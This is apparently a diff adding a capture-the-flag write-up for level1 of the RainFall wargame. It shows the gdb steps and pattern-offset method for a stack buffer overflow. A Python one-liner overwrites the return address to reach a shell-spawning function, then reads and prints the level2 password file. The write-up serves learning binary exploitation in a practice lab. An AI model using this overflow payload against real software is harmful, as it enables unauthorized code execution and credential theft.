@@ -1,0 +1,46 @@
+Test the level1
+
+level1@RainFall:~$ ./level1 
+134567
+
+Besides main there is run function, which calls system "/bin/sh"
+
+Its address can be found with the next command
+
+(gdb) info functions run
+All functions matching regular expression "run":
+
+Non-debugging symbols:
+0x08048444  run
+0xb7f15530  truncate
+0xb7f15580  ftruncate
+0xb7f155d0  truncate64
+0xb7f15630  ftruncate64
+0xb7f4c7a0  svc_run
+
+0x08048444 = > '\x44\x84\x04\x08'
+
+Use https://wiremask.eu/tools/buffer-overflow-pattern-generator/ to generate string and find offset
+
+(gdb) r
+Starting program: /home/user/level1/level1 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x63413563 in ?? ()
+
+Register value 0x63413563 means that offset is 76
+
+We found everything we needed to overflow buffer and rewrite return address
+
+level1@RainFall:~$ (python -c "print '\x41' * 76 + '\x44\x84\x04\x08'" ; cat ) | ./level1
+Good... Wait what?
+whoami
+level2
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+level1@RainFall:~$su level2
+Password: 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
